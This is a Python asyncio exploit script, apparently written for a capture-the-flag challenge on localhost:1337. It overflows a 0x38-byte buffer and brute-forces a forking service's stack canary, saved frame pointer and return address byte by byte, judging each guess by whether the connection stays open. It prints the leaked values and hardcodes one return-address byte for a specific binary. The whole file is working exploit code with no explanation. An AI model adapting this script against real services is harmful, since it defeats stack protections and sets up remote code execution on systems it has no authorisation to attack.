import asyncio, struct, time

HOST = "localhost"
PORT = 1337

BUF_OFF = 0x38
CANARY_SZ = 8
EBP_SZ = 8
RET_SZ = 8

READ_BANNER = 52
MAX_CONN = 20
TIMEOUT = 0.5

TRY_ORDER = [0] + list(range(1, 256))[::-1]

def u64(b):
    return struct.unpack("<Q", b)[0]

async def try_char(prefix, c, sem):
    async with sem:
        try:
            r, w = await asyncio.open_connection(HOST, PORT)

            if READ_BANNER > 0:
                try:
                    await asyncio.wait_for(r.read(READ_BANNER), timeout=TIMEOUT)
                except:
                    w.close()
                    await w.wait_closed()
                    return None

            w.write(prefix + bytes([c]))
            await w.drain()

            try:
                resp = await asyncio.wait_for(r.read(1), timeout=TIMEOUT)
            except:
                resp = b""

            w.close()
            await w.wait_closed()

            if resp:
                return c
            return None

        except:
            return None

async def brute(prefix, n, sem):
    for _ in range(n):
        print("prefix:", prefix)
        tasks = [asyncio.create_task(try_char(prefix, x, sem)) for x in TRY_ORDER]

        got = None
        try:
            for t in asyncio.as_completed(tasks):
                res = await t
                if res is not None:
                    got = res
                    break
        finally:
            for t in tasks:
                if not t.done():
                    t.cancel()

        if got is None:
            raise Exception("cant find byte here bro")

        prefix += bytes([got])
        print(" -> found:", hex(got))
    return prefix

async def main():
    t0 = time.perf_counter()
    sem = asyncio.BoundedSemaphore(MAX_CONN)

    pref = b"A" * BUF_OFF

    pref = await brute(pref, CANARY_SZ + EBP_SZ, sem)

    # this byte depend on binary, me just add it here
    pref += b"\x62"
    pref = await brute(pref, 7, sem)

    canary = u64(pref[BUF_OFF:BUF_OFF+8])
    ebp = u64(pref[BUF_OFF+8:BUF_OFF+16])
    ret = u64(pref[BUF_OFF+16:BUF_OFF+24])

    print("\ncanary:", hex(canary))
    print("ebp   :", hex(ebp))
    print("ret   :", hex(ret))

    print("\ndone in", time.perf_counter() - t0, "sec")

if __name__ == "__main__":
    asyncio.run(main())
